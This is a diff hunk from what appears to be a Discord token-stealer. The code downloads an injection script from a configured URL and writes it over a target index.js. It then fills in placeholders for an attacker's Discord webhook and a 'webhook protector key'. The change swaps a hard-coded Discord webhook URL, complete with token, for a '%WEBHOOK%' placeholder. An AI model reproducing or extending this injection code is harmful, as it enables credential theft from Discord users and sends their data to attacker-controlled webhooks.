@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('https://discord.com/api/webhooks/1057838645844918395/HjnT7a3hIoEO8Aai6s-WaRZkP8H0yDzdypl6v7UGgtsUHgINaeNeKJG6nRgpB_tUMV0r', '${config.webhook}')
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
